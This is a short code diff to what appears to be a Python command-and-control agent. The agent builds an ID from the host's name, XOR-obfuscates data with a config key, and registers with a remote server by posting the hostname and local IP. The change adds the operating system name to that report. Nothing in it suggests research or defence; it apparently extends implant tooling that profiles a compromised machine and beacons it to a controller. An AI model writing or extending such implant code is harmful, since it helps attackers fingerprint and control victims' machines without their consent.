@@ -1,4 +1,4 @@
-import json, subprocess, time, uuid, socket, requests
+import json, subprocess, time, uuid, socket, requests, platform
 import base64
 
 
@@ -11,6 +11,7 @@ CRYPTO_KEY = cfg.get("crypto_key", "secret")
 hostname = socket.gethostname()
 mac = uuid.getnode()
 AGENT_ID = f"Agent-{hostname}"
+os_info = platform.system()
 
 
 def xor(data: str, key=CRYPTO_KEY) -> str:
@@ -37,7 +38,8 @@ def register_agent():
         r = requests.post(f"{SERVER_URL}/register", json={
             "agent_id": AGENT_ID,
             "hostname": hostname,
-            "local_ip": local_ip
+            "local_ip": local_ip,
+            "os_info": os_info
         }, timeout=10)
         r.raise_for_status()
         print(f"[+] Registered {AGENT_ID} with server")
